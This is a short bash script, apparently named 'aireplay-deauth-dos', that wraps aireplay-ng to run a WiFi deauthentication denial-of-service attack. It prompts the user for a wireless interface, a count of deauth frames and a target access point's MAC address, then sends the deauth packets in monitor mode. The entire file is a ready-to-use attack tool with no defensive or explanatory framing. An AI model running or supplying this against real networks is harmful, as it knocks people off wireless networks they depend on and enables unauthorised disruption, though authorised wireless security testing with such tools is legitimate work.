#! /bin/bash
# aireplay-deauth-dos

echo Starting AIREPLAY-NG in AP DOS mode...
echo What is the name of the wireless interface wlan0, wlan1 etc no need to input wlan0mon etc
read -p 'Interface: ' invar
echo Enter number of deauths
read -p 'Number of deauths to send: ' deauthvar
echo Enter target WiFi AP MAC
read -p 'WiFi AP: ' bssidvar
aireplay-ng -0 $deauthvar -a $bssidvar ${invar}mon
echo Deauth finished!
